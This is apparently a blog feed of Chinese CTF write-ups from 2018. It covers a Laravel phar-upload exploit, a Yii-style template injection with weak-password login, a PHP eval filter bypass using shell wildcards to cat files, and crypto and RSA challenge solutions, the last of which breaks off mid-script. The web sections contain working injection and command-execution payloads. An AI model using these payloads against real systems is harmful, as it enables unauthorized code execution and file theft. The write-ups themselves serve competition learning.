?&gt;'</span>);</span><br><span class="line">    $p-&gt;setMetadata($b);</span><br><span class="line">    $p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">    rename(<span class="string">'skyfuck.phar'</span>, <span class="string">'skyfuck.gif'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后上传后触发<br><img src="/images/2018-10-13-20-42-48.png" alt=""><br>最后即可看到flag<br><img src="/images/2018-10-13-20-40-14.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这次护网杯的题目还是很nice的，感谢4uuu Nya大佬的nice题目，和赛后帮助我理解Laravel的bendawang师傅，给跪了~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2018安恒杯-9月月赛Writeup</title>
    <link href="http://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>http://skysec.top/2018/09/24/2018安恒杯-9月月赛Writeup/</id>
    <published>2018-09-24T11:59:13.000Z</published>
    <updated>2018-10-06T03:35:18.867Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客 https://www.anquanke.com/post/id/160582</span><br></pre></td></tr></table></figure><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p>首先弱密码爆进后台<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure></p><p>看到突兀的字体<br><img src="/images/2018-09-22-11-10-10.png" alt=""><br>一看就是出题人留下的了<br>探寻了一遍功能<br>发现添加图片处也有这种字体<br><img src="/images/2018-09-22-11-10-51.png" alt=""><br>很容易联想到漏洞点，于是开始代码审计<br>下载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10013/web/You_Cant_Guess.zip</span><br></pre></td></tr></table></figure></p><p>定位到图片位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function actionShow()&#123;</span><br><span class="line">    $template = &apos;&lt;h1&gt;图片内容为：&lt;/h1&gt;图片ID：&#123;cms:id&#125;&lt;br&gt;图片名称:&#123;cms:name&#125;&lt;br&gt;图片地址：&#123;cms:pic&#125;&apos;;</span><br><span class="line">    if (isset($_GET[&apos;id&apos;])) &#123;</span><br><span class="line">        $model = new Content();</span><br><span class="line">        $res = $model-&gt;find()-&gt;where([&apos;id&apos; =&gt;intval($_GET[&apos;id&apos;])])-&gt;one();</span><br><span class="line">        $template = str_replace(&quot;&#123;cms:id&#125;&quot;,$res-&gt;id,$template);</span><br><span class="line">        $template = str_replace(&quot;&#123;cms:name&#125;&quot;,$res-&gt;name,$template);</span><br><span class="line">        $template = str_replace(&quot;&#123;cms:pic&#125;&quot;,$res-&gt;url,$template);</span><br><span class="line">        $template = $this-&gt;parseIf($template);</span><br><span class="line">        echo $template;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return json_encode([&apos;error&apos;=&gt;&apos;id error!&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进函数<code>parseIf</code><br><img src="/images/2018-09-22-11-12-40.png" alt=""><br>参考文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/153402</span><br></pre></td></tr></table></figure></p><p>我们添加图片为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">skysec</span><br><span class="line">&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][sky]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][cool]);die();//&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure></p><p>然后访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10013/web/index.php?r=content%2Fshow&amp;id=1919&amp;sky=system&amp;cool=ls</span><br></pre></td></tr></table></figure></p><p>即可列目录<br><img src="/images/2018-09-22-11-26-31.png" alt=""><br>拿flag即可<br><img src="/images/2018-09-22-11-26-53.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;65bb1dd503d2a682b47fde40571598f4&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>拿到题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10014/</span><br></pre></td></tr></table></figure></p><p>代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>发现字母啥都被过滤了，第一反应就是通配符，容易想到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/??? =&gt; /bin/cat</span><br></pre></td></tr></table></figure></p><p>那么构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt;</span><br><span class="line">&quot;/bin/cat /var/www/html/index.php&quot;</span><br></pre></td></tr></table></figure></p><p>长度超过了上限<br>参考这篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/154284</span><br></pre></td></tr></table></figure></p><p>使用*通配<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=`/???/???%20/???/???/????/*`;?&gt;&lt;?=$_?&gt;</span><br></pre></td></tr></table></figure></p><p>但是没有$和_<br>改进为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt;</span><br></pre></td></tr></table></figure></p><p>得到<br><img src="/images/2018-09-22-10-45-34.png" alt=""><br>发现关键点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">$flag = file_get_contents(&apos;/flag&apos;);</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们直接读flag文件就好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?&gt;&lt;?=`/???/???%20/????`;?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-09-22-10-47-11.png" alt=""><br>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aa5237a5fc25af3fa07f1d724f7548d7&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h2><p>下载用winrar打开<br><img src="/images/2018-09-22-10-15-14.png" alt=""><br>很明显的长度为6的CRC32<br>我们用工具爆破一下<br><img src="/images/2018-09-22-10-18-39.png" alt=""><br><img src="/images/2018-09-22-10-18-57.png" alt=""><br><img src="/images/2018-09-22-10-19-18.png" alt=""><br>得到压缩包密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forum_91ctf_com_66</span><br></pre></td></tr></table></figure></p><p>解密后得到<br><img src="/images/2018-09-22-10-19-59.png" alt=""><br>我们n2s转成字符串，得到<br><img src="/images/2018-09-22-10-21-30.png" alt=""><br><img src="/images/2018-09-22-10-22-43.png" alt=""><br>扫描得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;owid0-o91hf-9iahg&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Misc2"><a href="#Misc2" class="headerlink" title="Misc2"></a>Misc2</h2><p>拿到题目是张图片，binwalk跑了一下发现了压缩包<br><img src="/images/2018-09-22-10-24-56.png" alt=""><br>提取出来需要密码解压，尝试了各种方法，最后竟然是修改图片高度，太脑洞了吧？？？<br><img src="/images/2018-09-22-10-26-20.png" alt=""><br>将原来的044C改为04FF，即可<br><img src="/images/2018-09-22-10-26-01.png" alt=""><br>解压后得到一个压缩包，本能的导出html对象<br><img src="/images/2018-09-22-10-28-18.png" alt=""><br>浏览一遍，发现可疑字符串，解base64，得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Oz_4nd_Hir0_lov3_For3ver&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h2><p>这题略带脑洞，解压出的密文为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ilnllliiikkninlekile</span><br></pre></td></tr></table></figure></p><p>长度为20<br><img src="/images/2018-09-22-10-09-41.png" alt=""><br>并且发现提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The length of this plaintext: 10</span><br></pre></td></tr></table></figure></p><p>密文长度是明文的2倍，然后密文只有5个字母出现，本能想到多表加密，但是不知道表的边缘的排序方式<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ilnke</span><br><span class="line">iklne</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></p><p>因为排序规则不同，就涉及对应的字母不同，所以这里我选择爆破一发<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">cipher = <span class="string">"ilnllliiikkninlekile"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">'ilnke'</span>, <span class="number">5</span>):</span><br><span class="line">    key.append(<span class="string">''</span>.join(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> now_key <span class="keyword">in</span> key:</span><br><span class="line">    solve_c = <span class="string">""</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c <span class="keyword">in</span> cipher:</span><br><span class="line">        solve_c += str(now_key.index(now_c))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(solve_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii = int(solve_c[i])*<span class="number">5</span>+int(solve_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">'i'</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        res += chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">print</span> now_key,res</span><br></pre></td></tr></table></figure></p><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linke flagishere</span><br><span class="line">linek flagkxhdwd</span><br></pre></td></tr></table></figure></p><p>一看就是第一个，结果交了不对。。。<br>后来发现要交md5，得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eedda7bea3964bfb288ca6004a973c2a&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h2><p>拿到题目<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    bs = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data = cipher.encrypt(pad(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data  = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> unpad(data)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_passwd</span><span class="params">(key)</span>:</span></span><br><span class="line">    data_halt = <span class="string">"LvR7GrlG0A4WIMBrUwTFoA=="</span>.decode(<span class="string">"base64"</span>)</span><br><span class="line">    rand_int =  int(decrypt(data_halt, key).encode(<span class="string">"hex"</span>), <span class="number">16</span>)</span><br><span class="line">    round = <span class="number">0x7DC59612</span></span><br><span class="line">    result = <span class="number">1</span>    </span><br><span class="line">    a1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a1 &lt; round:</span><br><span class="line">        a2 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> a2 &lt; round:</span><br><span class="line">            a3 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> a3 &lt; round:</span><br><span class="line">                result = result * (rand_int % <span class="number">0xB18E</span>) % <span class="number">0xB18E</span></span><br><span class="line">                a3 += <span class="number">1</span></span><br><span class="line">            a2 += <span class="number">1</span></span><br><span class="line">        a1 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(str(result), key)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    key = raw_input(<span class="string">"key:"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> len(key) != <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"check key length!"</span></span><br><span class="line">        exit()</span><br><span class="line">    passwd = generate_passwd(key.decode(<span class="string">"hex"</span>))</span><br><span class="line">    </span><br><span class="line">    flag = raw_input(<span class="string">"flag:"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"output:"</span>, encrypt(flag, passwd).encode(<span class="string">"base64"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># key = md5(sha1("flag"))</span></span><br><span class="line"><span class="comment"># output = "u6WHK2bnAsvTP/lPagu7c/K3la0mrveKrXryBPF/LKFE2HYgRNLGzr1J1yObUapw"</span></span><br></pre></td></tr></table></figure></p><p>我们不难看出这题的难点应该在于generate_passwd()了吧，加解密函数都给你写好了，调用就行，我们仔细观察这个generate_passwd()<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_passwd</span><span class="params">(key)</span>:</span></span><br><span class="line">    data_halt = <span class="string">"LvR7GrlG0A4WIMBrUwTFoA=="</span>.decode(<span class="string">"base64"</span>)</span><br><span class="line">    rand_int =  int(decrypt(data_halt, key).encode(<span class="string">"hex"</span>), <span class="number">16</span>)</span><br><span class="line">    round = <span class="number">0x7DC59612</span></span><br><span class="line">    result = <span class="number">1</span>    </span><br><span class="line">    a1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a1 &lt; round:</span><br><span class="line">        a2 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> a2 &lt; round:</span><br><span class="line">            a3 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> a3 &lt; round:</span><br><span class="line">                result = result * (rand_int % <span class="number">0xB18E</span>) % <span class="number">0xB18E</span></span><br><span class="line">                a3 += <span class="number">1</span></span><br><span class="line">            a2 += <span class="number">1</span></span><br><span class="line">        a1 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(str(result), key)</span><br></pre></td></tr></table></figure></p><p>看起来很复杂，还有3层循环，但仔细抓住result，发现其值一定小于0xB18E<br>那么爆破即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">output = <span class="string">"u6WHK2bnAsvTP/lPagu7c/K3la0mrveKrXryBPF/LKFE2HYgRNLGzr1J1yObUapw"</span></span><br><span class="line">key = md5(sha1(<span class="string">"flag"</span>))</span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> range(<span class="number">0xB18E</span>):</span><br><span class="line">    passwd = generate_passwd(key.decode(<span class="string">"hex"</span>),result)</span><br><span class="line">    r = decrypt(output.decode(<span class="string">"base64"</span>), passwd)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> r:</span><br><span class="line">        <span class="keyword">print</span> r</span><br></pre></td></tr></table></figure></p><p>拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;552d3a0e567542d99694c4d61d1a652e&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="writeup" scheme="http://skysec.top/categories/writeup/"/>
    
    
      <category term="writeup" scheme="http://skysec.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>2018-noxCTF-Crypto-RSA</title>
    <link href="http://skysec.top/2018/09/17/2018-noxCTF-Crypto-RSA/"/>
    <id>http://skysec.top/2018/09/17/2018-noxCTF-Crypto-RSA/</id>
    <published>2018-09-17T06:37:48.000Z</published>
    <updated>2018-10-06T03:28:31.300Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客 https://www.anquanke.com/post/id/159304</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2018-noxCTF的密码题中有许多RSA的题目，正好最近在看RSA，于是就做了一下，难度并不是很大</p><h2 id="Chop-Suey"><a href="#Chop-Suey" class="headerlink" title="Chop Suey"></a>Chop Suey</h2><p>题目如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Today I ate in a Chinese restaurant and got myself a fortune cookie. These things usually contain a note with a nice sentence or phrase, but mine had numbers in it instead! Can you help me find the meaning of the numbers?</span><br><span class="line"></span><br><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>还是先摆出已知条件</p><script type="math/tex; mode=display">dp \equiv d \text{ } mod \text{ } (p-1) \\dq \equiv d \text{ } mod \text{ } (q-1)</script><p>我们的目标很简单，如何从这些式子得到答案</p><script type="math/tex; mode=display">c^{d}</script><p>首先根据</p><script type="math/tex; mode=display">m \equiv c^{d} \text{ } mod \text{ } n</script><p>因为</p><script type="math/tex; mode=display">gcd(p,q)=1 \\n=p*q</script><p>利用中国剩余定理,我们可以得到</p><script type="math/tex; mode=display">\begin{cases}m_1 \equiv c^{d} \text{ } mod \text{ } p \\m_2 \equiv c^{d} \text{ } mod \text{ } q \\\end{cases}</script><p>由式1可以得到</p><script type="math/tex; mode=display">c^{d}=kp+m1</script><p>我们把这个带入式2<br>可以得到</p><script type="math/tex; mode=display">m_2 \equiv (kp+m1) \text{ } mod \text{ } q</script><p>等式两边同时减去m1,可以得到</p><script type="math/tex; mode=display">(m2-m1) \equiv kp \text{ } mod \text{ } q</script><p>这里因为</p><script type="math/tex; mode=display">gcd(p,q)=1</script><p>所以可以求p的逆元，得到</p><script type="math/tex; mode=display">(m2-m1)*p^{-1} \equiv k \text{ } mod \text{ } q</script><p>所以这里得到如下两个式子</p><script type="math/tex; mode=display">k \equiv (m2-m1)*p^{-1} \text{ } mod \text{ } q \\c^{d}=kp+m1 \\m \equiv c^{d} \text{ } mod \text{ } n</script><p>我们上下两个式子合并，得到</p><script type="math/tex; mode=display">c^{d}=((m2-m1)*p^{-1} \text{ } mod \text{ } q)p+m1 \\m \equiv c^{d} \text{ } mod \text{ } n</script><p>最后可以有</p><script type="math/tex; mode=display">m \equiv (((m2-m1)*p^{-1} \text{ } mod \text{ } q)p+m1) \text{ } mod \text{ } n</script><p>那么问题来了</p><script type="math/tex; mode=display">m_1 \equiv c^{d} \text{ } mod \text{ } q \\m_2 \equiv c^{d} \text{ } mod \text{ } p</script><p>这里的m1和m2怎么求？<br>这时候我们有</p><script type="math/tex; mode=display">\begin{cases}d \equiv dp \text{ } mod \text{ } (p-1) \\d \equiv dq \text{ } mod \text{ } (q-1)\end{cases}</script><p>那么分别带入，有</p><script type="math/tex; mode=display">\begin{cases}m_1 \equiv c^{dq \text{ } mod \text{ } (q-1)} \text{ } mod \text{ } q \\m_2 \equiv c^{dp \text{ } mod \text{ } (p-1)} \text{ } mod \text{ } p\end{cases}</script><p>所以我们有</p><script type="math/tex; mode=display">\begin{cases}m_1 \equiv c^{dq} \text{ } mod \text{ } q \\m_2 \equiv c^{dp} \text{ } mod \text{ } p \\m \equiv (((m2-m1)*p^{-1} \text{ } mod \text{ } q)p+m1) \text{ } mod \text{ } n \end{cases}</script><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>推导完成后，写脚本即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(dp,dq,p,q,c)</span>:</span></span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = pow(c, dp, p)</span><br><span class="line">    mq = pow(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ) % p)*q+mq</span><br><span class="line">    <span class="keyword">print</span> libnum.n2s(m)</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span></span><br><span class="line">q = <span 